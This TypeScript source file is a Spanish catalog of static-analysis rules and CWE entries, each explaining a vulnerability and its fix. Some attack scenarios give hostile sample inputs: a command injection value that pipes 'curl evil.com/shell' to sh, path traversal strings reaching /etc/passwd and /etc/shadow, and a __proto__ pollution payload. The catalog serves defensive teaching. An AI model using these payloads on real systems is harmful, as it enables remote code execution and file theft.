// ============================================================
// Catálogo en ESPAÑOL. Ver lib/catalog/index.ts para saber cómo se consulta.
// Refleja lib/catalog/pt-BR.ts — las claves deben mantenerse sincronizadas
// (tests/catalog.test.ts lo comprueba).
// ============================================================
import type { Entry } from "./types";

export const RULES: Record<string, Entry> = {
  "avoid-pickle": {
    title: "Deserialización con pickle",
    whatItIs: "Uso de `pickle` para deserializar datos.",
    whyItMatters:
      "`pickle` ejecuta código al deserializar: un payload preparado se convierte en ejecución remota dentro del proceso de Python.",
    attackScenario:
      "Un objeto pickle con `__reduce__` dispara `os.system` al cargarse.",
    howToFix:
      "Usa `json` para datos. Si necesitas binario, prefiere formatos sin ejecución (msgpack, protobuf) y valida el esquema.",
  },
  "dangerous-subprocess-use": {
    title: "Subproceso a través de una shell",
    whatItIs: "Llamada a subproceso con `shell=True` o con una cadena montada.",
    whyItMatters:
      "La shell interpreta `;`, `|` y `&&` — cualquier entrada externa se convierte en ejecución arbitraria de comandos.",
    howToFix:
      "Pasa la lista de argumentos y mantén `shell=False` (el valor por defecto). Valida la entrada contra una lista blanca.",
  },
  "dangerous-system-call": {
    title: "Llamada directa al sistema",
    whatItIs: "Uso de `os.system` / `popen` con una cadena.",
    whyItMatters:
      "Siempre pasa por la shell, así que concatenar entrada es inyección de comandos directa.",
    howToFix: "Cambia a `subprocess.run` con una lista de argumentos.",
  },
  "sqlalchemy-execute-raw-query": {
    title: "SQL crudo en SQLAlchemy",
    whatItIs: "Consulta SQL construida por concatenación o f-string.",
    whyItMatters:
      "Esto es inyección SQL: el atacante altera la consulta y llega a los datos de otros usuarios.",
    howToFix:
      "Usa `text()` con parámetros con nombre (`:id`) o la API de consultas del ORM.",
  },
  "flask-wtf-missing-csrf-protection": {
    title: "Flask sin protección CSRF",
    whatItIs: "Aplicación Flask sin CSRFProtect configurado.",
    whyItMatters:
      "Sin token, otro sitio puede disparar acciones autenticadas en el navegador de la víctima.",
    howToFix: "Activa `CSRFProtect(app)` e incluye el token en los formularios.",
  },
  "django-secret-key": {
    title: "SECRET_KEY en el código",
    whatItIs: "La SECRET_KEY de Django está escrita en el código.",
    whyItMatters:
      "Con ella se pueden falsificar sesiones y tokens firmados — equivale a convertirse en cualquier usuario.",
    howToFix:
      "Muévela a una variable de entorno y ROTA la clave expuesta (las sesiones actuales caen, y eso es lo esperado).",
  },
  "math-random-used": {
    title: "Aleatoriedad no criptográfica",
    whatItIs:
      "Uso de un generador pseudoaleatorio común para un valor de seguridad.",
    whyItMatters:
      "`Math.random`/`random` son predecibles: un token de sesión o de recuperación generado así se puede adivinar.",
    howToFix:
      "Usa `crypto.randomUUID()`/`crypto.getRandomValues` (JS) o `secrets` (Python).",
  },
  "jwt-python-none-algorithm": {
    title: "JWT que acepta el algoritmo none",
    whatItIs: "Verificación de JWT que acepta el algoritmo `none`.",
    whyItMatters:
      "El atacante quita la firma y falsifica cualquier contenido del token, incluido el rol de administrador.",
    howToFix:
      "Fija los algoritmos aceptados (`algorithms=[\"RS256\"]`) y nunca confíes en la cabecera del token.",
  },
  "jwt-hardcode": {
    title: "Secreto JWT en el código",
    whatItIs: "La clave de firma del JWT está en el código fuente.",
    whyItMatters:
      "Cualquiera que lea el repositorio puede firmar tokens válidos para cualquier usuario.",
    howToFix: "Muévela a una variable de entorno y rota la clave expuesta.",
  },
  "gorilla-csrf-not-configured": {
    title: "Go: CSRF sin configurar",
    whatItIs: "Servidor Go sin middleware CSRF en las rutas que cambian estado.",
    whyItMatters:
      "Otro sitio puede disparar acciones autenticadas usando la cookie de la víctima.",
    howToFix:
      "Aplica el middleware CSRF y valida el token en las rutas que mutan datos.",
  },
  "formatted-sql-query": {
    title: "SQL construido por formateo",
    whatItIs: "Consulta SQL construida con formateo de cadenas.",
    whyItMatters: "La vía clásica de inyección SQL, independientemente del lenguaje.",
    howToFix:
      "Usa los parámetros del driver; nunca interpoles un valor dentro de la cadena.",
  },
  "insecure-cipher-algorithm": {
    title: "Cifrado inseguro",
    whatItIs: "Uso de un algoritmo de cifrado roto (DES, RC4, ECB).",
    whyItMatters:
      "Los datos son recuperables en la práctica — el cifrado da una falsa sensación de protección.",
    howToFix: "Usa AES-GCM (o ChaCha20-Poly1305) con un IV aleatorio por mensaje.",
  },
  "insecure-hash-function": {
    title: "Hash inseguro",
    whatItIs: "Uso de MD5 o SHA-1.",
    whyItMatters:
      "Son vulnerables a colisiones; para contraseñas además son demasiado rápidos y caen ante ataques de diccionario.",
    howToFix: "SHA-256+ para integridad; Argon2id o bcrypt para contraseñas.",
  },
  "tainted-sql-string": {
    title: "SQL con entrada no confiable",
    whatItIs: "Entrada externa llega a la construcción de una consulta SQL.",
    whyItMatters:
      "Inyección SQL con la ruta de ataque ya trazada por la herramienta.",
    howToFix: "Parametriza la consulta y valida el tipo de la entrada.",
  },
  "ssrf-requests": {
    title: "Petición a una URL no confiable",
    whatItIs: "La URL de destino viene de una entrada externa.",
    whyItMatters:
      "El servidor consulta lo que el atacante apunte, incluidos servicios internos y metadatos de la nube (169.254.169.254).",
    howToFix:
      "Valida contra una lista blanca de dominios y bloquea los rangos privados, también después de las redirecciones.",
  },
  "missing-integrity": {
    title: "Script externo sin integridad",
    whatItIs: "Etiqueta `<script>`/`<link>` externa sin atributo `integrity`.",
    whyItMatters:
      "Si el CDN se ve comprometido, el script alterado se ejecuta en tu página con acceso completo a la sesión.",
    howToFix: "Añade `integrity` con el hash y `crossorigin=\"anonymous\"`.",
  },
  "detect-child-process": {
    title: "Ejecución de comandos del sistema",
    whatItIs:
      "El código ejecuta comandos del sistema operativo desde dentro del programa.",
    whyItMatters:
      "Si alguna parte del comando viene de la entrada del usuario, un atacante encadena sus propios comandos y acaba ejecutando código en el servidor con los privilegios de la aplicación.",
    attackScenario:
      "Un valor como `archivo.txt; curl evil.com/shell | sh` convierte un comando inofensivo en ejecución remota.",
    howToFix:
      "Sustituye `exec`/`execSync` por `execFile`/`spawn` pasando los argumentos como ARRAY (la shell deja de interpretar la cadena) y valida la entrada contra una lista blanca.",
  },
  "detect-non-literal-fs-filename": {
    title: "Ruta de archivo construida dinámicamente",
    whatItIs:
      "Una ruta de archivo se monta en tiempo de ejecución en lugar de estar fija en el código.",
    whyItMatters:
      "Si la ruta acepta `../`, un atacante escapa del directorio previsto y lee o escribe archivos arbitrarios del servidor — incluidos `.env` y claves privadas.",
    attackScenario:
      "Pedir `../../../../etc/passwd` en un parámetro que acaba siendo un nombre de archivo.",
    howToFix:
      "Normaliza con `path.resolve` y confirma que el resultado se queda dentro del directorio permitido antes de abrirlo. Mejor todavía: acepta un identificador y mapéalo a la ruta en el servidor.",
  },
  "path-join-resolve-traversal": {
    title: "Path traversal mediante path.join",
    whatItIs:
      "Una ruta suministrada desde fuera se concatena con un directorio base vía `path.join`/`resolve`.",
    whyItMatters:
      "`path.join` resuelve `..` en silencio, así que el resultado puede apuntar fuera del directorio previsto.",
    attackScenario:
      "`path.join('/uploads', '../../etc/shadow')` da `/etc/shadow`.",
    howToFix:
      "Tras resolver, comprueba `resolved.startsWith(baseDir + path.sep)` y rechaza todo lo que se salga de la base.",
  },
  "detect-non-literal-require": {
    title: "Módulo cargado por nombre dinámico",
    whatItIs: "Se carga un módulo a partir de un nombre calculado en ejecución.",
    whyItMatters:
      "Si el nombre tiene alguna influencia externa, un atacante carga un módulo arbitrario del disco y ejecuta su código.",
    howToFix:
      "Usa un mapa fijo de nombres de módulo permitidos en vez de construir la ruta dinámicamente.",
  },
  "detect-non-literal-regexp": {
    title: "Expresión regular construida en ejecución",
    whatItIs: "Una expresión regular se construye a partir de un valor dinámico.",
    whyItMatters:
      "Además de errores de sintaxis en ejecución, un patrón suministrado desde fuera puede provocar backtracking catastrófico (ReDoS) y colgar todo el proceso con una sola petición.",
    howToFix:
      "Usa patrones fijos. Si tienes que interpolar, escapa los metacaracteres y limita la longitud de la entrada.",
  },
  "detect-redos": {
    title: "Regex vulnerable a ReDoS",
    whatItIs:
      "La expresión regular tiene un patrón propenso al backtracking catastrófico.",
    whyItMatters:
      "Una entrada relativamente corta hace que el motor de regex explore un número exponencial de caminos, bloqueando el event loop y tumbando el servicio.",
    attackScenario:
      "Un campo con decenas de caracteres repetidos deja la CPU al 100 % durante minutos.",
    howToFix:
      "Reescribe el patrón eliminando los cuantificadores anidados (`(a+)+`), o cambia a un parseo sin regex. Limita la longitud de la entrada antes de aplicarlo.",
  },
  "prototype-pollution-assignment": {
    title: "Contaminación de prototipo por asignación",
    whatItIs:
      "Una asignación usa una clave dinámica, lo que permite escribir en `__proto__`.",
    whyItMatters:
      "Contaminar el prototipo afecta a TODOS los objetos del proceso: permite a un atacante falsificar propiedades de autorización y cambiar el comportamiento de las bibliotecas.",
    attackScenario:
      'Un JSON con `{"__proto__": {"isAdmin": true}}` hace que cualquier objeto declare `isAdmin`.',
    howToFix:
      "Rechaza las claves `__proto__`, `constructor` y `prototype`, o usa `Map`/`Object.create(null)` para los datos externos.",
  },
  "prototype-pollution-loop": {
    title: "Contaminación de prototipo en copia recursiva",
    whatItIs: "Copia recursiva de objetos sin protección contra `__proto__`.",
    whyItMatters:
      "Es el vector clásico de contaminación de prototipo en utilidades de merge/clone.",
    howToFix:
      "Salta las claves peligrosas en el bucle, o usa `structuredClone`/una biblioteca que ya lo contemple.",
  },
  "insecure-innerhtml": {
    title: "HTML inyectado en el DOM sin sanear",
    whatItIs: "Se inserta HTML en la página asignando directamente al DOM.",
    whyItMatters:
      "Cualquier contenido sin sanear se convierte en un script que corre en el navegador de la víctima con acceso a su sesión (XSS).",
    howToFix:
      "Usa `textContent` para texto. Si necesitas HTML, sanéalo con una biblioteca dedicada (DOMPurify) antes de insertarlo.",
  },
  "react-dangerouslysetinnerhtml": {
    title: "dangerouslySetInnerHTML sin saneamiento",
    whatItIs: "Uso de `dangerouslySetInnerHTML` en React.",
    whyItMatters:
      "Este atributo desactiva la protección automática de React contra XSS — el contenido se inserta en crudo.",
    howToFix:
      "Renderiza como texto siempre que puedas; si el HTML es imprescindible, sanéalo antes.",
  },
  "raw-html-format": {
    title: "HTML construido por concatenación de cadenas",
    whatItIs: "HTML montado concatenando cadenas.",
    whyItMatters:
      "Interpolar un valor sin escapar dentro de HTML es la fuente más común de XSS reflejado y almacenado.",
    howToFix:
      "Usa el sistema de plantillas del framework (que escapa por defecto) o escapa explícitamente cada valor interpolado.",
  },
  "jquery-insecure-selector": {
    title: "Selector de jQuery con un valor dinámico",
    whatItIs: "Un selector de jQuery se construye con un valor dinámico.",
    whyItMatters:
      "jQuery trata los selectores que empiezan por `<` como HTML — el valor se convierte en un elemento ejecutable en el DOM.",
    howToFix:
      "Usa `document.querySelector` con un selector fijo, o `$(document).find(valor)` tras validarlo.",
  },
  "unsafe-dynamic-method": {
    title: "Método invocado por nombre dinámico",
    whatItIs: "Se invoca un método a través de un nombre calculado en ejecución.",
    whyItMatters:
      "Si el nombre puede influirse desde fuera, un atacante llama a métodos no previstos del objeto (incluidos los heredados del prototipo).",
    howToFix:
      "Usa un mapa explícito de nombre → función y rechaza todo lo que no esté en él.",
  },
  "js-open-redirect-from-function": {
    title: "Redirección abierta",
    whatItIs: "Una redirección usa un destino que viene de fuera.",
    whyItMatters:
      "El atacante usa tu dominio como trampolín para una página de phishing — el enlace parece legítimo porque empieza en tu sitio.",
    howToFix:
      "Acepta solo rutas relativas, o valida el destino contra una lista blanca de dominios.",
  },
  "bypass-tls-verification": {
    title: "Verificación de certificado TLS desactivada",
    whatItIs: "Se desactiva la verificación del certificado TLS.",
    whyItMatters:
      "Sin validar el certificado, cualquier intermediario de red lee y altera el tráfico — el cifrado deja de proteger frente a un atacante activo.",
    howToFix:
      "Elimina `rejectUnauthorized: false` / `verify=False`. Para un certificado interno, instala la CA en el almacén de confianza en lugar de desactivar la comprobación.",
  },
  "third-party-action-not-pinned-to-commit-sha": {
    title: "GitHub Action de terceros sin fijar",
    whatItIs:
      "Una GitHub Action de terceros se referencia por etiqueta (`@v3`) en vez de por SHA de commit.",
    whyItMatters:
      "Las etiquetas se pueden mover: quien controle el repositorio de la action puede reapuntar `v3` a código malicioso, que entonces se ejecuta en tu CI con acceso a los secretos del pipeline.",
    attackScenario:
      "La cuenta del mantenedor se ve comprometida, la etiqueta se reapunta y la siguiente compilación exfiltra las credenciales de despliegue.",
    howToFix:
      "Fija el SHA de commit completo (`uses: owner/action@<sha40>`) y actualiza de forma deliberada, por ejemplo con Dependabot.",
  },
  "dockerfile-source-not-pinned": {
    title: "Imagen base de Docker sin fijar",
    whatItIs: "La imagen base del Dockerfile no está fijada.",
    whyItMatters:
      "Las compilaciones dejan de ser reproducibles y una imagen base modificada entra en tu entorno sin revisión.",
    howToFix:
      "Fíjala por digest (`FROM imagen@sha256:...`) o al menos por versión exacta.",
  },
  "package-dependencies-check": {
    title: "Dependencias con versiones sin fijar",
    whatItIs:
      "La declaración de dependencias permite versiones flotantes (rangos como `^` o `*`).",
    whyItMatters:
      "Una versión publicada con código malicioso entra en la siguiente instalación sin que nadie la revise — el vector de ataque a la cadena de suministro más común en npm.",
    howToFix:
      "Fija las versiones y sube el lockfile al repositorio. Usa `npm ci` en CI, que instala exactamente lo que dice el lock.",
  },
  "generic-api-key": {
    title: "Clave de API en el código",
    whatItIs: "Lo que parece una clave de API está escrito en el código fuente.",
    whyItMatters:
      "Un secreto en el repositorio se filtra a todos los que puedan clonarlo — y permanece en el historial de git incluso tras eliminarlo.",
    howToFix:
      "Muévela a una variable de entorno, REVOCA la clave expuesta (trátala como comprometida) y limpia el historial si el repositorio es público.",
  },
  "detected-generic-secret": {
    title: "Secreto en el código",
    whatItIs: "Un valor que parece un secreto está en el código fuente.",
    whyItMatters:
      "Las credenciales en un repositorio son el hallazgo más explotado por los escáneres automáticos — los bots encuentran claves públicas en cuestión de minutos.",
    howToFix: "Muévelo a una variable de entorno y revoca el valor expuesto.",
  },
  "private-key": {
    title: "Clave privada subida al repositorio",
    whatItIs: "Hay una clave privada subida al repositorio.",
    whyItMatters:
      "Quien tenga la clave asume la identidad del servicio: firma tokens, descifra tráfico o accede a servidores.",
    howToFix:
      "Elimínala, GENERA UN NUEVO PAR y distribuye la clave mediante un gestor de secretos. Trata la clave antigua como comprometida.",
  },
  "unsafe-formatstring": {
    title: "Cadena de formato dinámica",
    whatItIs: "Una cadena de formato se construye dinámicamente.",
    whyItMatters:
      "Según el lenguaje, esto permite leer memoria o provocar errores no controlados.",
    howToFix: "Usa una cadena de formato fija y pasa los valores como argumentos.",
  },
  "eqeq-is-bad": {
    title: "Igualdad débil (==) en vez de estricta",
    whatItIs: "Comparación con `==` en lugar de `===`.",
    whyItMatters:
      "La coerción de tipos de JavaScript crea igualdades sorprendentes (`0 == '0'`, `'' == false`), que en una comprobación de permisos se convierten en un fallo de autorización.",
    howToFix: "Usa `===`/`!==` y convierte los tipos explícitamente.",
  },
  "useless-assignment": {
    title: "Asignación nunca usada",
    whatItIs: "Una variable recibe un valor que nunca se usa.",
    whyItMatters:
      "No es un fallo de seguridad en sí, pero suele señalar lógica incompleta — incluida una validación que se escribió y nunca se aplicó.",
    howToFix:
      "Elimina la asignación, o usa el valor si la intención era validarlo.",
  },
};

export const CWES: Record<string, Entry> = {
  "CWE-78": {
    title: "Inyección de comandos del sistema",
    whatItIs: "Inyección de comandos del sistema operativo.",
    whyItMatters:
      "Una entrada no confiable llega a un intérprete de comandos y el atacante ejecuta lo que quiera en el servidor.",
    howToFix:
      "Ejecuta con los argumentos como array (sin shell) y valida la entrada contra una lista blanca.",
  },
  "CWE-79": {
    title: "Cross-site scripting (XSS)",
    whatItIs: "Cross-site scripting (XSS).",
    whyItMatters:
      "Un script controlado por el atacante se ejecuta en el navegador de la víctima con su sesión — suficiente para robar tokens y actuar como ese usuario.",
    howToFix:
      "Escapa la salida según el contexto (HTML, atributo, JS) y sanea cualquier HTML que aceptes.",
  },
  "CWE-89": {
    title: "Inyección SQL",
    whatItIs: "Inyección SQL.",
    whyItMatters:
      "El atacante altera la consulta y lee, cambia o borra datos a los que nunca debería llegar — a menudo toda la base de datos.",
    howToFix:
      "Usa consultas parametrizadas (marcadores del driver). Nunca concatenes entrada en la cadena SQL.",
  },
  "CWE-22": {
    title: "Path traversal",
    whatItIs: "Recorrido de directorios (path traversal).",
    whyItMatters:
      "Permite leer o escribir archivos fuera del directorio previsto, incluidos configuración y secretos.",
    howToFix:
      "Normaliza la ruta y confirma que se queda dentro del directorio base.",
  },
  "CWE-94": {
    title: "Inyección de código",
    whatItIs: "Inyección de código.",
    whyItMatters:
      "Una entrada no confiable se interpreta como código del propio programa.",
    howToFix:
      "Abandona `eval`/`Function`; usa estructuras de datos en lugar de código generado.",
  },
  "CWE-502": {
    title: "Deserialización insegura",
    whatItIs: "Deserialización insegura.",
    whyItMatters:
      "Objetos que vienen de fuera pueden provocar ejecución de código mientras se reconstruyen.",
    howToFix:
      "Deserializa solo formatos de datos puros (JSON) y valida el esquema antes de usarlos.",
  },
  "CWE-611": {
    title: "Entidades externas XML (XXE)",
    whatItIs: "Procesamiento de XML con entidades externas (XXE).",
    whyItMatters:
      "Permite leer archivos locales y alcanzar servicios internos desde el parser.",
    howToFix: "Desactiva las entidades externas y el DTD en el parser XML.",
  },
  "CWE-918": {
    title: "Server-Side Request Forgery (SSRF)",
    whatItIs: "Server-Side Request Forgery (SSRF).",
    whyItMatters:
      "El servidor hace peticiones a donde apunte el atacante, alcanzando servicios internos y metadatos de la nube.",
    howToFix:
      "Restringe los destinos a una lista blanca de dominios y bloquea los rangos de IP privadas, también tras las redirecciones.",
  },
  "CWE-798": {
    title: "Credencial escrita en el código",
    whatItIs: "Credencial incrustada en el código.",
    whyItMatters:
      "Cualquiera que lea el código — o el historial de git — obtiene acceso directo al recurso protegido.",
    howToFix: "Muévela a una variable de entorno y revoca el valor expuesto.",
  },
  "CWE-327": {
    title: "Criptografía débil u obsoleta",
    whatItIs: "Algoritmo criptográfico débil u obsoleto.",
    whyItMatters:
      "Los algoritmos rotos (MD5, SHA-1, DES) no dan la protección que la arquitectura da por supuesta.",
    howToFix:
      "Usa AES-GCM para cifrar, SHA-256+ para hash de datos y Argon2/bcrypt para contraseñas.",
  },
  "CWE-601": {
    title: "Redirección abierta",
    whatItIs: "Redirección abierta.",
    whyItMatters: "Tu dominio presta credibilidad a un enlace de phishing.",
    howToFix:
      "Acepta solo rutas relativas o destinos de una lista blanca.",
  },
  "CWE-1321": {
    title: "Contaminación de prototipo",
    whatItIs: "Contaminación de prototipo.",
    whyItMatters:
      "Cambia el comportamiento de todos los objetos del proceso, incluidas las comprobaciones de permisos.",
    howToFix:
      "Rechaza `__proto__`/`constructor`/`prototype` en los datos externos.",
  },
  "CWE-1333": {
    title: "Regex de complejidad exponencial (ReDoS)",
    whatItIs: "Expresión regular con complejidad exponencial (ReDoS).",
    whyItMatters:
      "Una petición pequeña consume CPU indefinidamente y tumba el servicio.",
    howToFix: "Reescribe el patrón y limita la longitud de la entrada.",
  },
  "CWE-1357": {
    title: "Componente de confianza insuficiente",
    whatItIs: "Dependencia de un componente de terceros de confianza insuficiente.",
    whyItMatters:
      "El código de terceros se ejecuta con los mismos privilegios que el tuyo — si cambia, tú ejecutas ese cambio.",
    howToFix: "Fija la versión por digest/SHA y revisa las actualizaciones.",
  },
};
